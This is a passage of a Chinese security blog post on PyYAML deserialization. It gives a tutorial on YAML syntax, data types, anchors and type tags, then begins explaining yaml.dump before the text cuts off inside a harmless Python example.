
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>PyYmal反序列化 - hybcx's blog</title>

  
    <meta name="description" content="0x01 YMAL简介 YAML是一种轻量级的数据序列化语言，它的名称是&quot;YAML Ain’t Markup Language&quot;的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。 YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等）、序列（数组、列表等）和映射（键值对）。YAML还支持注释和引用，可以使文档更易于理解和维护。（其">
<meta property="og:type" content="article">
<meta property="og:title" content="PyYmal反序列化">
<meta property="og:url" content="http://hybcx.xyz/2024/03/23/pyyaml-fan-xu-lie-hua/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 YMAL简介 YAML是一种轻量级的数据序列化语言，它的名称是&quot;YAML Ain’t Markup Language&quot;的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。 YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等）、序列（数组、列表等）和映射（键值对）。YAML还支持注释和引用，可以使文档更易于理解和维护。（其">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205101617.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323173508853.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174218701.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174321497.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174544420.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174607818.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323181930329.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182001245.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182111649.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182238889.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182352277.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183135875.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183218060.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183801409.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183952814.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184103109.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184448506.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184625946.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184747589.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185058636.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185156973.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185455281.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190158410.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190713616.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190925079.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323191911886.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323192750492.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193432525.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193545793.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193704301.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323195256661.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200529942.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200802243.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200939494.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205827050.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323210251975.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323210433928.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323213632644.png">
<meta property="article:published_time" content="2024-03-23T07:11:50.882Z">
<meta property="article:modified_time" content="2024-03-23T14:20:54.410Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="基本知识">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205101617.png">
  
  
  
  <meta name="keywords" content="基本知识">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/"><span class="title">第十五届圈钱杯wp</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">web知识总结</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-03-23T07:11:50.882Z">2024-03-23</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-03-23T14:20:54.410Z">2024-03-23</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>PyYmal反序列化</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-ymal简介">0x01 YMAL简介</h1>
<p>YAML是一种轻量级的数据序列化语言，它的名称是"YAML Ain’t Markup Language"的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。</p>
<p>YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等）、序列（数组、列表等）和映射（键值对）。YAML还支持注释和引用，可以使文档更易于理解和维护。（其文件一般以.yml为后缀）</p>
<h1 id="0x02-yaml基本语法">0x02 Yaml基本语法</h1>
<p>这里也就是纯cv了。</p>
<ul>
<li>
<p><strong>大小写敏感</strong></p>
<pre><code class="hljs scss">aaa:<span class="hljs-number">1</span>
AAA:<span class="hljs-number">2</span></code></pre>
<p>这两个对于Yaml来说是不同的变量</p>
</li>
<li>
<p><strong>使用缩进表示层级关系缩进不允许使用tab，只允许空格</strong></p>
</li>
<li>
<p><strong>缩进的空格数不重要，只要相同层级的元素左对齐即可</strong></p>
<p>举个例子，</p>
<pre><code class="hljs scss"># This is <span class="hljs-selector-tag">a</span> YAML document with nested structures
person:
  name: John
  age: <span class="hljs-number">30</span>
  address:
    street: Main St.
    city: Anytown
    state: CA
  hobbies:
    - reading
    - hiking
    - swimming</code></pre>
<p>在这个示例中，<code>person</code>是一个映射类型，包含四个键值对。其中<code>address</code>和<code>hobbies</code>都是映射类型和序列类型的嵌套结构，使用缩进表示层级关系。<code>address</code>包含三个键值对，<code>hobbies</code>包含一个序列，其中包含三个元素。</p>
</li>
<li>
<p><strong>'#'表示注释</strong></p>
<p>但是只能支持单行注释</p>
<pre><code class="hljs scss">#注释<span class="hljs-number">1</span>
#注释<span class="hljs-number">2</span></code></pre>
</li>
<li>
<p><strong>一个文件中可以包含多个文件的内容，用“ — ”即三个破折号表示一份内容的开始，用“ … ”即三个小数点表示一份内容的结束（非必需）</strong></p>
</li>
</ul>
<pre><code class="hljs scss">---
example1:
  username: admin
  passwd: <span class="hljs-number">123456</span>
...

---
example2:
  username: aaa
  passwd: <span class="hljs-number">666</span>
...</code></pre>
<h1 id="0x03-yaml数据类型与结构">0x03 Yaml数据类型与结构</h1>
<ul>
<li>
<p><strong>标量（Scalar）</strong>：标量是YAML中的基本数据类型，包括字符串、整数、浮点数、布尔值等。例如：</p>
<pre><code class="hljs scss">name: <span class="hljs-string">"John"</span>  # 字符串
age: <span class="hljs-number">30</span>       # 整数 （可以支持二进制表示）
height: <span class="hljs-number">5.8</span>   # 浮点数 （可以支持科学计数法）
is_student: false  # 布尔值 (null,Null,~均为空)</code></pre>
</li>
<li>
<p><strong>列表（List）</strong>：列表用短横线（-）表示，可以包含多个标量值，形成一个有序的序列。例如：</p>
<pre><code class="hljs scss">fruits:
  - apple
  - banana
  - orange</code></pre>
<p>支持<strong>内敛格式</strong>（用方括号包裹，用逗号+空格分隔），例如：</p>
<pre><code class="hljs scss">fruit: [apple, banana, orange]</code></pre>
<p>支持多维数组（<strong>用缩进表示层级关系</strong>），例如：</p>
<pre><code class="hljs scss">fruit: 
-
  - apple
  - banana
-
  - orange</code></pre>
</li>
<li>
<p><strong>映射（Mapping）</strong>：映射用键值对表示，使用冒号（:）分隔键和值，可以包含多个键值对，形成一个无序的键值对集合。例如：</p>
<pre><code class="hljs scss">person:
  name: John
  age: <span class="hljs-number">30</span>
  city: New York</code></pre>
<p>支持<strong>流式风格</strong>的语法(用花括号包裹，用逗号+空格分割)，例如：</p>
</li>
</ul>
<pre><code class="hljs scss">key: { username: admin, passwd: <span class="hljs-number">123456</span>}</code></pre>
<p>可以使用“?”声明一个复杂对象，从而可以使用多个数组来组成键，例如：</p>
<pre><code class="hljs scss">?
  - user1
  - user2
:
  - passwd1
  - passwd2</code></pre>
<p>允许多层嵌套(<strong>用缩进表示层级关系</strong>)，例如：</p>
<pre><code class="hljs scss">example:
  aaa: <span class="hljs-number">123</span>
  bbb:
    ccc:
      ddd: <span class="hljs-number">666</span></code></pre>
<p>在这个示例中，<code>example</code>是一个映射类型，包含一个键值对<code>aaa</code>和一个键值对<code>bbb</code>。<code>bbb</code>的值是一个映射类型，包含一个键值对<code>ccc</code>，而<code>ccc</code>的值又是一个映射类型，包含一个键值对<code>ddd</code>。<code>ddd</code>的值为<code>666</code>。</p>
<ul>
<li>
<p><strong>多行字符串（Multi-line String）</strong>：YAML支持在标量值中使用多行字符串，可以使用管道符（|）或折叠式大于号（&gt;）来表示。例如：</p>
<pre><code class="hljs scss">description: |
  This is a multi-line
  string using the pipe symbol. # 每行的缩进和行尾空白都会被去掉，而额外的缩进会被保留
lines: &gt;
  aaa
  bbbbbb
  ccccccc

  dddddddd  # 只有空白行才会被识别为换行，原来的换行符都会被转换成空格</code></pre>
<p>字符串一般不用引号包裹，但是如果字符串中使用了<strong>反斜杠“\”开头的转义字符就必须用引号包裹</strong>，例如</p>
<pre><code class="hljs scss">strings: 
  - Hi
  - <span class="hljs-string">"\u0048\u0069"</span> # Hi的Unicode编码
  - <span class="hljs-string">"\x46\x69\x6e\x65"</span> # Fine的Hex编码</code></pre>
<p><strong>引用（Reference）</strong>：YAML支持使用锚点（&amp;）和别名（*）来创建引用，可以在不同位置引用相同的值。例如：</p>
<pre><code class="hljs scss">person1: &amp;person_alias
  name: John
  age: <span class="hljs-number">30</span>

person2: *person_alias</code></pre>
<p>相当于</p>
<pre><code class="hljs scss">person1:
  name: John
  age: <span class="hljs-number">30</span>

person2:
  name: John
  age: <span class="hljs-number">30</span></code></pre>
<p>可以利用**锚点（&amp;）和别名（*）<strong>以及</strong>合并标签"&lt;&lt;"**将我们的yaml变得更加整洁，例如：</p>
<pre><code class="hljs scss"># 使用锚点和别名消除重复代码
defaults: &amp;defaults
  host: localhost
  port: <span class="hljs-number">8080</span>
  timeout: <span class="hljs-number">30</span>

development:
  &lt;&lt;: *defaults
  database: dev_db

test:
  &lt;&lt;: *defaults
  database: test_db
  timeout: <span class="hljs-number">60</span>

production:
  &lt;&lt;: *defaults
  host: prod_host
  port: <span class="hljs-number">80</span></code></pre>
<p>相当于</p>
<pre><code class="hljs scss">development:
  host: localhost
  port: <span class="hljs-number">8080</span>
  timeout: <span class="hljs-number">30</span>
  database: dev_db

test:
  host: localhost
  port: <span class="hljs-number">8080</span>
  timeout: <span class="hljs-number">60</span>
  database: test_db

production:
  host: prod_host
  port: <span class="hljs-number">80</span>
  timeout: <span class="hljs-number">30</span></code></pre>
</li>
<li>
<p><strong>时间戳（Timestamp）</strong>：在YAML中，可以使用ISO 8601格式的时间戳来表示日期和时间。ISO 8601是一种国际标准，用于表示日期、时间和日期时间的格式，例如：</p>
<pre><code class="hljs scss">timestamp: <span class="hljs-number">2023</span>-<span class="hljs-number">04</span>-<span class="hljs-number">24</span>T12:<span class="hljs-number">34</span>:<span class="hljs-number">56.789</span>Z</code></pre>
</li>
</ul>
<p><strong>类型转换</strong></p>
<p>Yaml支持使用**严格类型标签"!!"（双感叹号+目标类型）**来强制转换类型，例如：</p>
<pre><code class="hljs scss"># 使用显式类型转换将字符串转换成整数和浮点数
age: !!int <span class="hljs-number">30</span>
pi: !!float <span class="hljs-number">3.14</span>

# 使用显式类型转换将数字转换成字符串
number_as_str: !!str <span class="hljs-number">123</span>

# 使用显式类型转换将字符串转换成布尔值
is_valid: !!bool <span class="hljs-string">"true"</span>

# 使用显式类型转换将时间戳转换成日期时间
created_at: !!timestamp <span class="hljs-number">2023</span>-<span class="hljs-number">04</span>-<span class="hljs-number">24</span>T12:<span class="hljs-number">34</span>:<span class="hljs-number">56.789</span>Z

# 使用显式类型转换将列表转换成其他类型
list_as_str: !!str [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
list_as_map: !!map [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]</code></pre>
<h1 id="0x04-反序列化漏洞成因">0x04 反序列化漏洞成因</h1>
<h2 id="pyyamllt51">PyYaml&lt;=5.1</h2>
<p>在python中的PyYAML库中提供这几种方式实现python和Yaml这两种语言的转换。</p>
<h3 id="yaml-gtpython">yaml-&gt;python</h3>
<p><strong>yaml.dump</strong></p>
<pre><code class="hljs scss">yaml<span class="hljs-selector-class">.dump</span>(data)</code></pre>
<p>将Python对象<code>data</code>转换为YAML格式的方法。它将Python对象序列化为YAML格式的字符串，并返回这个字符串。在这个方法中，<code>data</code>是一个Python对象，可以是字典、列表、元组、整数、浮点数、字符串、布尔值等基本数据类型，也可以是自定义的类的实例。</p>
<p>举个例子：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

data = {
    <span class="hljs-string">'name'</span>: <span class="hljs-string">'John'</span>,
    <span class="hljs-string">'age'</span>: <span class="hljs-number">30</span>,
    <span class="hljs-string">'is_student'</span>: <span class="hljs-literal">True</span>,
    <span class="hljs-string">'hobbies'</span>: [<span class="hljs-string">'reading'</span>, <span class="hljs-string">'swimming'</span>, <span class="hljs-string">'traveling'</span>],
    <span class="hljs-string">'address'</span>: {
        <span class="hljs-string">'street'</span>: <span class="hljs-string">'123 Main St'</span>,
        <span class="hljs-string">'city'</span>: <span class="hljs-string">'Anytown'</span>,
        <span class="hljs-string">'state'</span>: <span class="hljs-string">'CA'</span>,
